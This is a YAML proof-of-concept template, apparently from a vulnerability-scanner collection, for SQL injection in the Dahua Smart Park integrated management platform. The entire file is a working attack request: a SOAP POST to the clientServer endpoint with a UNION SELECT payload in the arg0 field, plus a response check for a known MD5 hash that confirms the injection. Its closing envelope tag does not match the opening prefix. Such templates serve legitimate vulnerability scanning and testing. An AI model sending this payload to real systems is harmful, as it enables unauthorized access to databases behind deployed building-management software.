poc/yaml-poc/poc-yaml-大华智慧园区-clientServer-SQL.yaml

name: 大华智慧园区综合管理平台-clientServer-SQL
description: >-
  SQL注入
alwaysExecute: false
matchCount: 1
rules:
  - method: POST
    path: /portal/services/clientServer
    headers:
      Content-Type: text/xml  
    body: |
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:cli="http://clientServer.webservice.dssc.dahua.com">
          <soapenv:Header/>
          <soapenv:Body>
          <cli:getGroupInfoListByGroupId>
            <!--type: string-->
              <arg0>-5398) UNION ALL SELECT 5336,5336,5336,5336,md5(123456)-- -</arg0>
            <!--type: long-->
            <arg1>10</arg1>
            </cli:getGroupInfoListByGroupId>
          </soapenv:Body>
        </soap:Envelope>
    expression:
      body_all: ["e10adc3949ba59abbe56e057f20f883e"]